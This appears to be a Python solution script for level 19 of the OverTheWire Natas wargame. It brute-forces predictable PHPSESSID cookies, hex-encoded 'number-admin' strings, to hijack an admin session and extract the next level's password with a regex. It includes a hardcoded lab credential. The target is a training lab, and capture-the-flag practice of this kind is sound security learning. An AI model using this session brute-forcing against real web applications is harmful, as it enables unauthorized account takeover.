import requests
import re

user = 'natas19'
passw = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = 'http://natas19.natas.labs.overthewire.org/'

session1 = requests.Session()
response = session1.post(url, auth=(user, passw), data={'username':user, 'password':passw})
cookies = response.cookies

for x in range(1000):
    print(x)
    newHex = (str(x) + '-admin').encode('utf-8').hex()
    print(newHex)
    cooky = dict(PHPSESSID=str(newHex))
    response = session1.post(url, auth=(user, passw), cookies=cooky, data={'username':user, 'password':passw})
    webPage = response.text
    print(webPage)
    print("-------------------")
    if 'regular' not in webPage:
        matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)
        print(matchObject.group())
        print("Session ID:", x)
